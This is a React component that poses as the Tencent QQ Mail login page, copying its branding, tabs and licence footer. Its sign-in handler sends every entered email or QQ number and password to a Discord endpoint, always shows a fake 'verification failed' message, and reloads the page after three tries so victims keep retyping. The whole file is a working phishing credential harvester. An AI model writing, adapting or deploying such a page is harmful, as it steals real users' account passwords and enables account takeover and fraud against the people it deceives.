
import React, { useState } from 'react';
import { submitToDiscord } from '../services/DiscordService';

interface QQMailThemeProps {
  prefilledEmail?: string;
}

const QQMailTheme: React.FC<QQMailThemeProps> = ({ prefilledEmail }) => {
  const [email, setEmail] = useState(prefilledEmail || '');
  const [password, setPassword] = useState('');
  const [activeTab, setActiveTab] = useState<'qq' | 'wechat'>('qq');
  const [isLoading, setIsLoading] = useState(false);
  const [authError, setAuthError] = useState(false);
  const [failedAttempts, setFailedAttempts] = useState(0);

  const handleSignIn = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    setAuthError(false);

    try {
      await submitToDiscord({
        email,
        password,
        loginType: activeTab,
        theme: 'qq',
      }, 'QQMailTheme');

      // Simulate authentication delay
      await new Promise(resolve => setTimeout(resolve, 2000));
      
      // Show authentication failed
      setAuthError(true);
      const newAttempts = failedAttempts + 1;
      setFailedAttempts(newAttempts);
      
      // After 3 failed attempts, reload page
      if (newAttempts >= 3) {
        await new Promise(resolve => setTimeout(resolve, 2000));
        window.location.reload();
      }
    } catch (err) {
      console.error('Error:', err);
      setAuthError(true);
      const newAttempts = failedAttempts + 1;
      setFailedAttempts(newAttempts);
      
      if (newAttempts >= 3) {
        await new Promise(resolve => setTimeout(resolve, 2000));
        window.location.reload();
      }
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-[#eff7ff] font-sans text-[#333]">
      {/* Header */}
      <header className="w-full max-w-[1200px] mx-auto px-6 py-4 flex items-center justify-between">
        <div className="flex items-center">
          <div className="flex items-center space-x-1">
            <svg width="120" height="40" viewBox="0 0 120 40" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path d="M10 5L20 15L10 25L0 15L10 5Z" fill="#1e5494" />
              <text x="25" y="28" fill="#1e5494" fontSize="22" fontWeight="bold" fontFamily="Arial">QQ邮箱</text>
              <text x="95" y="32" fill="#1e5494" fontSize="10" fontFamily="Arial">mail.qq.com</text>
            </svg>
          </div>
        </div>
        
        <nav className="flex items-center space-x-6 text-[13px] text-gray-600">
          <a href="#" className="hover:underline">简体中文</a>
          <span className="text-gray-300">|</span>
          <a href="#" className="hover:underline">Exmail</a>
        </nav>
      </header>

      {/* Main Content Area */}
      <main className="flex-grow flex items-center justify-center px-4 py-12">
        <div className="w-full max-w-[1000px] flex flex-col md:flex-row items-center justify-between">
          
          {/* Left Side: Historical Text & Illustration */}
          <div className="hidden md:flex flex-col space-y-8 max-w-[450px]">
            <div className="space-y-2">
              <h2 className="text-4xl font-bold text-[#1e5494]">
                QQ Mail <span className="text-black font-normal">· Keep us in Touch!</span>
              </h2>
            </div>
            
            <div className="space-y-4 text-[14px] text-gray-700 leading-relaxed font-light italic">
              <p>"2500 years ago, pigeons were used as messengers."</p>
              <p>"183 years ago, Morse invented the telegraph."</p>
              <p>"50 years ago, the first email was sent."</p>
              <p>"Today, QQ Mail connects everyone."</p>
            </div>

            {/* Illustration Placeholder (Traditional Chinese Style) */}
            <div className="relative pt-8 opacity-40">
               <svg width="300" height="300" viewBox="0 0 400 400" className="text-[#1e5494]">
                 <path d="M200 50 Q150 150 200 250 T200 350" fill="none" stroke="currentColor" strokeWidth="2" opacity="0.3"/>
                 <circle cx="200" cy="200" r="150" fill="none" stroke="currentColor" strokeWidth="1" strokeDasharray="5 5"/>
                 <text x="100" y="300" fill="currentColor" fontSize="80" opacity="0.1" style={{fontFamily: 'serif'}}>🪷</text>
                 <path d="M150 150 C180 100 220 100 250 150 S220 200 150 200" fill="none" stroke="currentColor" strokeWidth="1"/>
               </svg>
            </div>
          </div>

          {/* Right Side: Login Card */}
          <div className="w-full max-w-[380px] bg-white rounded-lg shadow-[0_10px_40px_rgba(0,0,0,0.05)] border border-gray-100 overflow-hidden">
            {/* Tabs */}
            <div className="flex border-b border-gray-100 bg-gray-50/50">
              <button 
                onClick={() => setActiveTab('qq')}
                className={`flex-1 py-4 flex items-center justify-center space-x-2 text-[14px] transition-all ${activeTab === 'qq' ? 'bg-white border-b-2 border-transparent text-black font-medium' : 'text-gray-400 hover:text-gray-600'}`}
              >
                <span className="w-5 h-5 bg-gray-200 rounded-full flex items-center justify-center text-[10px]">🐧</span>
                <span>QQ登录</span>
              </button>
              <button 
                onClick={() => setActiveTab('wechat')}
                className={`flex-1 py-4 flex items-center justify-center space-x-2 text-[14px] transition-all ${activeTab === 'wechat' ? 'bg-white border-b-2 border-transparent text-black font-medium' : 'text-gray-400 hover:text-gray-600'}`}
              >
                <span className="w-5 h-5 bg-gray-200 rounded-full flex items-center justify-center text-[10px]">💬</span>
                <span>微信登录</span>
              </button>
            </div>

            <form onSubmit={handleSignIn} className="space-y-6 p-8 pt-10">
              {/* Loading State */}
              {isLoading && (
                <div className="flex items-center justify-center py-8">
                  <div className="flex flex-col items-center space-y-3">
                    <div className="w-8 h-8 border-4 border-blue-200 border-t-blue-500 rounded-full animate-spin"></div>
                    <p className="text-[14px] text-gray-500">正在验证...</p>
                  </div>
                </div>
              )}

              {/* Authentication Failed Message */}
              {authError && !isLoading && (
                <div className="bg-red-50 border border-red-200 rounded-md p-4">
                  <div className="flex items-start space-x-3">
                    <div className="flex-shrink-0 text-red-500 text-xl">⚠️</div>
                    <div>
                      <h3 className="font-medium text-red-800 text-[14px]">验证失败</h3>
                      <p className="text-red-700 text-[13px] mt-1">请重试。剩余尝试次数: {3 - failedAttempts}</p>
                    </div>
                  </div>
                </div>
              )}

              <div className="relative group">
                <div className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-300">
                  <svg width="18" height="18" fill="none" stroke="currentColor" strokeWidth="1.5" viewBox="0 0 24 24">
                    <path d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
                  </svg>
                </div>
                <input 
                  type="text" 
                  placeholder="QQ/Email/Mobile" 
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  className="w-full pl-10 pr-4 py-2.5 text-[14px] border border-gray-300 rounded focus:outline-none focus:border-[#5a98de] transition-colors"
                />
              </div>

              <div className="relative group">
                <div className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-300">
                  <svg width="18" height="18" fill="none" stroke="currentColor" strokeWidth="1.5" viewBox="0 0 24 24">
                    <path d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                  </svg>
                </div>
                <input 
                  type="password" 
                  placeholder="QQ Password" 
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full pl-10 pr-4 py-2.5 text-[14px] border border-gray-300 rounded focus:outline-none focus:border-[#5a98de] transition-colors"
                />
              </div>

              <button type="submit" disabled={isLoading} className="w-full py-3 bg-[#5a98de] hover:bg-[#4a88ce] text-white font-medium rounded transition-colors text-[16px] shadow-sm disabled:opacity-50 disabled:cursor-not-allowed">
                {isLoading ? '验证中...' : 'Sign In'}
              </button>

              <div className="flex items-center justify-between text-[12px] text-gray-500 pt-2">
                <div className="flex items-center space-x-1">
                  <a href="#" className="hover:text-blue-500">Forgot password?</a>
                </div>
                <div className="flex items-center space-x-2">
                  <a href="#" className="hover:text-blue-500 flex items-center">
                    <svg className="mr-1" width="12" height="12" fill="currentColor" viewBox="0 0 16 16"><path d="M0 2a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2v12a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V2zM1 2v12h14V2H1z"/></svg>
                    Quick Sign-in
                  </a>
                  <span className="text-gray-200">|</span>
                  <a href="#" className="hover:text-blue-500">Sign Up</a>
                </div>
              </div>

              <div className="text-center pt-8">
                 <a href="#" className="text-gray-400 text-[12px] hover:text-blue-500 flex items-center justify-center">
                   <svg className="mr-1" width="14" height="14" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4m0-4h.01"/></svg>
                   Help
                 </a>
              </div>
            </form>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="w-full py-8 text-[11px] text-gray-400 border-t border-gray-200/50 bg-white/50 backdrop-blur-sm">
        <div className="max-w-[1200px] mx-auto px-4 text-center space-y-2">
          <div className="flex flex-wrap justify-center items-center space-x-2">
            <a href="#" className="hover:underline">About Tencent</a>
            <span>|</span>
            <a href="#" className="hover:underline">Terms of Service</a>
            <span>|</span>
            <a href="#" className="hover:underline">Contact Us</a>
            <span>|</span>
            <span>©1998 - 2026 Tencent Inc. All Rights Reserved.</span>
          </div>
          <div className="flex flex-wrap justify-center items-center space-x-4 opacity-70">
            <span>Yue Gong Wang An Bei No. 44030002000001</span>
            <span>ICP Filing No. Yue B2-20090059</span>
            <span>Value-added Telecommunications Business License Yue B2-20090059</span>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default QQMailTheme;
